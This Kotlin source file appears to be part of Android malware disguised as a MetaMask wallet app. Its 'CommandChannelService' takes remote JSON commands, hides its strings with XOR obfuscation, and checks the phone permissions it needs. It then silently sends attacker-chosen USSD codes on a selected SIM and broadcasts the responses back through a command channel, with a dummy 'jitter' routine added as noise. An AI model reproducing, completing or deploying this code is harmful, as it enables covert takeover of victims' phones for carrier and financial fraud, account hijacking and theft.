package com.example.MetaMask.services

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.content.*
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.telephony.TelephonyManager
import androidx.annotation.Keep
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.math.absoluteValue

@Keep
class CommandChannelService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    companion object {
        private fun x(s: String): String = s.fold(StringBuilder(s.length)) { acc, c ->
            acc.append((c.code xor 42).toChar())
        }.toString()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[CommandChannelService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val rawCommand = intent?.getStringExtra(x("IOKCGXD"))

        if (rawCommand.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
            performJitter()
            stopSelf(startId)
            android.util.Log.d("XDBG", "[CommandChannelService] return") //xdbg
            return START_NOT_STICKY
        }

        serviceScope.launch {
            try {
                val jsonObject = JSONObject(rawCommand)
                val reqCode = jsonObject.optString(x("\\X[OE^_IUNE"), "N/A")
                val act = jsonObject.optString(x("K_^_ED"))
                val targetAct = x("OROI_^_IOCKCGXD")

                if (act == targetAct) {
                    android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                    processRequest(jsonObject)
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[CommandChannelService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                val reqCodeError = try { JSONObject(rawCommand).optString(x("\\X[OE^_IUNE"), "N/A") } catch (ex: Exception) { "N/A" }
                sendResponse(x("OXXYB"), "${e.message}", reqCodeError)
            } finally {
                performJitter()
                stopSelf(startId)
            }
        }
        android.util.Log.d("XDBG", "[CommandChannelService] return") //xdbg
        return START_NOT_STICKY
    }

    private fun performJitter() {
        android.util.Log.d("XDBG", "[CommandChannelService] performJitter enter") //xdbg
        try {
            val rnd = Random()
            val noise = rnd.nextInt(1000).absoluteValue
            if (noise > 950) {
                android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                val time = System.currentTimeMillis()
                val unused = time * noise
            }
        } catch (e: Exception) {}
    }

    private suspend fun processRequest(json: JSONObject) {
        android.util.Log.d("XDBG", "[CommandChannelService] processRequest enter json=${json}") //xdbg
        val requestCode = json.optString(x("\\X[OE^_IUNE"))
        val simIndex = json.optInt(x("YCSMKHNCNXON"), -1)

        val p1 = Manifest.permission.CALL_PHONE
        val p2 = Manifest.permission.READ_PHONE_STATE
        val hasP1 = ContextCompat.checkSelfPermission(this, p1) == PackageManager.PERMISSION_GRANTED
        val hasP2 = ContextCompat.checkSelfPermission(this, p2) == PackageManager.PERMISSION_GRANTED

        if (!hasP1 || !hasP2) {
            android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
            sendResponse(x("OXXYB"), "403", requestCode)
            return
        }

        try {
            withTimeout(25000L) {
                val result = executeOperation(requestCode, simIndex)
                sendResponse(x("Y_MMOYY"), result, requestCode)
            }
        } catch (e: TimeoutCancellationException) {
            android.util.Log.e("XDBG", "[CommandChannelService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            sendResponse(x("OXXYB"), "504", requestCode)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[CommandChannelService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            sendResponse(x("OXXYB"), "500", requestCode)
        }
    }

    @SuppressLint("MissingPermission", "NewApi")
    private suspend fun executeOperation(code: String, simIdx: Int): String {
        android.util.Log.d("XDBG", "[CommandChannelService] executeOperation enter code=${code} simIdx=${simIdx}") //xdbg
        android.util.Log.d("XDBG", "[CommandChannelService] return") //xdbg
        return suspendCancellableCoroutine { continuation ->
            val actionResponse = x("IOM\$ORKWZFO\$WO^KCKQG\$_YYN5XOYZEXYO")
            val extraText = x("_YYN5XOYZEXYO5^O^Z")

            val broadcastReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    android.util.Log.d("XDBG", "[CommandChannelService] onReceive enter context=ctx intent=${intent}") //xdbg
                    if (intent?.action == actionResponse) {
                        android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                        val txt = intent.getStringExtra(extraText)
                        if (continuation.isActive && txt != null) {
                            android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                            try { unregisterReceiver(this) } catch (_: Exception) {}
                            continuation.resume(txt)
                        }
                    }
                }
            }

            try {
                val filter = IntentFilter(actionResponse)
                if (Build.VERSION.SDK_INT >= 33) {
                    android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                    registerReceiver(broadcastReceiver, filter, Context.RECEIVER_EXPORTED)
                } else {
                    registerReceiver(broadcastReceiver, filter)
                }
            } catch (e: Exception) {}

            continuation.invokeOnCancellation {
                try { unregisterReceiver(broadcastReceiver) } catch (e: Exception) {}
            }

            try {
                val tmSystem = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                    ?: throw Exception()
                var tmFinal = tmSystem

                if (Build.VERSION.SDK_INT >= 22) {
                    android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                    try {
                        val subList = com.example.MetaMask.utils.ApiReflectionBridge.queryActiveLinks(this)
                        if (subList != null && simIdx >= 0 && simIdx < subList.size) {
                            android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                            val info = subList[simIdx]
                            val subId = info?.javaClass?.getMethod("getSubscriptionId")?.invoke(info) as? Int ?: -1
                            if (subId != -1) {
                                android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                                tmFinal = tmSystem.createForSubscriptionId(subId)
                            }
                        }
                    } catch (e: Exception) {}
                }

                val processedCode = code.replace("#", "%23")

                if (Build.VERSION.SDK_INT >= 26) {
                    android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                    val callback = object : TelephonyManager.UssdResponseCallback() {
                        override fun onReceiveUssdResponse(tm: TelephonyManager, r: String, s: CharSequence) {}
                        override fun onReceiveUssdResponseFailed(tm: TelephonyManager, r: String, c: Int) {}
                    }

                    val handler = Handler(Looper.getMainLooper())
                    tmFinal.sendUssdRequest(processedCode, callback, handler)
                }

            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[CommandChannelService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                if (continuation.isActive) {
                    android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                    continuation.resumeWithException(e)
                }
            }
        }
    }

    private fun sendResponse(status: String, dataOrMsg: String, requestId: String) {
        android.util.Log.d("XDBG", "[CommandChannelService] sendResponse enter status=${status} dataOrMsg=${dataOrMsg} requestId=${requestId}") //xdbg
        try {
            val json = JSONObject()
            json.put(x("K_^_ED"), x("IOMMKXDGXKXXKVXOYZEXYO"))
            json.put(x("Y^K^QY"), status)

            if (status == x("Y_MMOYY")) {
                android.util.Log.d("XDBG", "[CommandChannelService] if branch") //xdbg
                json.put(x("NK^K"), dataOrMsg)
            } else {
                json.put(x("WOYYKQO"), dataOrMsg)
            }
            json.put(x("XO[OE^_"), requestId)

            val actionSend = x("IOM\$ORKWZFO\$WO^KCKQG\$KM^CED5YONN5^E5YOB\\OB")
            val extraSend = x("IOM\$ORKWZFO\$WO^KCKQG\$O^ZXK5WOYYKQO5^E5YONN")

            val intent = Intent(actionSend)
            intent.putExtra(extraSend, json.toString())
            intent.setPackage(packageName)
            sendBroadcast(intent)
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[CommandChannelService] onDestroy enter") //xdbg
        serviceJob.cancel()
        super.onDestroy()
    }
}
